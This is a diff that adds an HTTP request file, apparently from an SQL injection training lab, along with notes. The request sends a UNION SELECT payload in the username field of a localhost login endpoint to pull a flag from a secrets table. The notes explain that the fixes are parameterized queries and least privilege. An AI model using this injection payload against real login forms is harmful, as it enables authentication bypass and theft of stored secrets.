@@ -1,0 +1,51 @@
+info:
+  name: UNION exfiltrates the flag
+  type: http
+  seq: 4
+
+http:
+  method: POST
+  url: http://localhost:8001/api/v1/vulnerable/auth/login
+  headers:
+    - name: Content-Type
+      value: application/json
+  body:
+    type: json
+    data: |-
+      {
+        "username": "' UNION SELECT id, name, value FROM secrets WHERE name = 'flag'--",
+        "password": "anything"
+      }
+  auth:
+    type: none
+
+runtime:
+  scripts:
+    - type: after-response
+      code: |-
+        bru.setVar("token", res.body.access_token);
+  assertions:
+    - expression: res.status
+      operator: eq
+      value: "200"
+
+docs: |-
+  # 02.4 — Data exfiltration through the token claims
+
+  The payload appends a row from a table the login query was never about:
+
+  ```sql
+  SELECT id, username, role FROM users WHERE username = ''
+  UNION SELECT id, name, value FROM secrets WHERE name = 'flag'--
+  ```
+
+  The application has no way to tell that row apart from a user, so it builds a principal
+  out of it and signs it. Run 01.4: `username` is `flag` and `role` is
+  `FLAG{sql_injection_demo}`.
+
+  Two separate failures meet here, and only one of them is the injection:
+
+  1. **the query is built from a string** — that is the bug, and parameterization fixes it.
+  2. **`lab_legacy` may read `secrets`** — that is a grant nobody needed, and it is what
+     decides how much the bug is worth. Least privilege would not have stopped the login
+     bypass; it would have stopped this.
